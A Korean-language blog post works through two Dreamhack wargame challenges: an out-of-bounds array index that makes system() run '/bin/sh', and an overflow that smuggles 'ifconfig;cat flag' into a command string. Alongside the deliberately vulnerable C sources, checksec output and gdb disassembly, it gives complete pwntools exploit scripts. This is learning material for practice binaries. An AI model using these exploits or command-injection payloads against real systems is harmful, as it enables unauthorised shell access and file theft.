---
layout: post
title: <System Hacking> 26. Out of Bound, Command Injection
date: 2026-05-12 10:31:23 +0900
category: System_Hacking
comments: true
---

## Introduction

사실 OOB 취약점은 개념 자체는 단순해서 예전에 따로 포스팅을 안했었다. 그래도 복습의 차원에서, 개념보다는 예제 위주로 설명을 진행해보려고 한다.

### OOB Example

Dreamhack의 OOB 예제이다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char name[16];

char *command[10] = { "cat",
    "ls",
    "id",
    "ps",
    "file ./oob" };
void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main()
{
    int idx;

    initialize();

    printf("Admin name: ");
    read(0, name, sizeof(name));
    printf("What do you want?: ");

    scanf("%d", &idx);

    system(command[idx]);

    return 0;
}
```

### Check security

우선, `checksec`을 통해 보호 기법을 확인하자.

```bash
$ checksec out_of_bound
[*] '/home/conan/Study/Dreamhack/out_of_bound'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

No PIE이기 때문에, CODE, DATA, BSS 영역의 주소가 항상 동일한 주소에 로드됨을 알 수 있다.

### Exploit Design

1. `system(command[idx])`에서 `command[idx]`에 `/bin/sh`문자열의 주소가 들어가준다면 아주 딱 좋은 익스플로잇 코드가 될 것 같다고 직감할 수 있다.
2. `scanf("%d", &idx)`를 통해 `command[idx]`에서 OOB 취약점을 유발시킴으로써, `command` 문자열 배열 근처의 `name` 배열의 값을 불러오기 딱 좋아보인다.
3. 32비트 바이너리인 만큼 8바이트가 아닌 4바이트씩 연산해야 함을 주의하자.

### .data, .bss의 개념

여기서 GDB를 통해 디버깅을 하다보면, '`command` 전에 `name`이 붙어서 존재하겠지?'라는 내 예상과는 다른 결과가 나온다.

```bash
pwndbg> i var name
All variables matching regular expression "name":
...
Non-debugging symbols:
0x0804a0ac  name
0xf7fee380  audit_iface_names
0xf7ffd9cc  newname
0xf7fb1814  name
0xf7fb42b4  old_file_name

pwndbg> i var command
All variables matching regular expression "command":

Non-debugging symbols:
0x0804a060  command
```

결과를 보면 `command`보다 `name`이 **무려 0x4c 뒤에 존재**한다. 이유를 분석해보니, 두 변수의 영역이 애초에 다르다.

```c
char name[16];          // 초기화 안됨 → .bss
char *command[10] = {...}; // 초기화됨 → .data
```

되게 당연한 이유지만, 놓치기 쉬운 부분이라 잘 기억해두려고한다.

### system()의 인자는 주소로!

처음에 익스플로잇을 시도할 때는 문자열 `/bin/sh`를 인자로 전달했는데, 그러면 당연히 결과가 의도한 대로 안나온다. **`system`함수의 인자는 문자열의 주소**로 전달해야한다. 그래서 방법을 찾고자 하니, `name[16]`의 길이가 눈에 띈다.

```
name[0~7]   = "/bin/sh\x00"
name[8~11]  = 0x0804a0ac (주소)
```

이렇게 넣는다면 공간이 충분히 들어갈 것으로 보인다. 이후, `system`의 인자로 저 '주소'를 전달하면 성공적으로 쉘 획득이 가능해보인다.

### 최종 코드

```python
from pwn import *

p = process('./out_of_bound')

payload = b'/bin/sh\x00' + p32(0x0804a0ac)

p.sendafter('Admin name: ', payload)

p.sendlineafter('What do you want?: ', b'21')

p.interactive()
```

그동안 작성했던 익스플로잇 코드중에 가장 짧은 것 같다.

## Command Injection

이 개념도 정말 단순한 거고, 문제를 통해서 그때그때 어떤 아이디어로 명령어를 삽입할지 승부해야 되는 영역이라 예시 문제로 넘어가겠다.

### Command Injection Example

Dreamhack의 예제이다.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void init() {
        setvbuf(stdin, 0, 2, 0);
        setvbuf(stdout, 0, 2, 0);
}

int main()
{

        char cmd_ip[256] = "ifconfig";
        int dummy;
        char center_name[24];

        init();

        printf("Center name: ");
        read(0, center_name, 100);


        if( !strncmp(cmd_ip, "ifconfig", 8)) {
                system(cmd_ip);
        }

        else {
                printf("Something is wrong!\n");
        }
        exit(0);
}
```

### Check Security

우선, `checksec`을 통해 보호 기법을 확인하자.

```bash
$ checksec cmd_center
[*] '/home/Study/Dreamhack/Solved_Prob/cmd_center'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

Canary만 적용되지 않은 상태. 다만 NX가 적용되어 있어서 Return to Shellcode같은 공격은 안될것같다.

### Exploit Design

우선 GDB를 통해 디버깅을 해보면,

```sh
pwndbg> disass
Dump of assembler code for function main:
...
   0x0000555555400916 <+105>:   lea    rax,[rbp-0x130]
   0x000055555540091d <+112>:   mov    edx,0x64
   0x0000555555400922 <+117>:   mov    rsi,rax
   0x0000555555400925 <+120>:   mov    edi,0x0
   0x000055555540092a <+125>:   call   0x555555400720 <read@plt>
   0x000055555540092f <+130>:   lea    rax,[rbp-0x110]
   0x0000555555400936 <+137>:   mov    edx,0x8
   0x000055555540093b <+142>:   lea    rsi,[rip+0xd0]        # 0x555555400a12
   0x0000555555400942 <+149>:   mov    rdi,rax
   0x0000555555400945 <+152>:   call   0x5555554006e0 <strncmp@plt>
   0x000055555540094a <+157>:   test   eax,eax
   0x000055555540094c <+159>:   jne    0x55555540095f <main+178>
   0x000055555540094e <+161>:   lea    rax,[rbp-0x110]
   0x0000555555400955 <+168>:   mov    rdi,rax
   0x0000555555400958 <+171>:   call   0x555555400700 <system@plt>
...
```

`read`를 통해 입력을 받되, `center_name` 배열을 한참 뛰어넘게 입력받을 수 있다. 따라서 BOF 공격이 가능한가? 라고도 생각할 수 있다. 하지만 여기서는 Return Address까지 도달하지는 못하므로, 다른 방법을 생각해봐야한다.

<br/>

`system`을 통해 항상 `system('/bin/sh')`만 다뤄와서 놓치기 쉬운데, 사실 **`system` 함수 자체는 쉘에서 명령어를 실행하는 함수**이기 때문에, 굳이 쉘을 딸 필요가 없이, 본 문제의 목적인 **Flag 읽기**만 달성하면 된다.

<br/>

따라서, 마침 `center_name[24]`의 여유공간도 있겠다, `strncmp`의 검증도 우회할 겸, 명령어의 병렬 실행을 통해 원하는 흐름으로 조작이 가능하다. 그래서 `ifconfig;cat flag`로 명령어를 살짝 조작할 수 있다.

### 최종 코드

최종 정답은 다음과 같다.

```python
from pwn import *

p = process('./cmd_center')

payload = b'A'*0x20
payload += b'ifconfig;cat flag'

p.sendafter('Center name: ', payload)

p.interactive()
```

아이디어만 알면 그 어떤 페이로드보다도 짧고 간단하다.
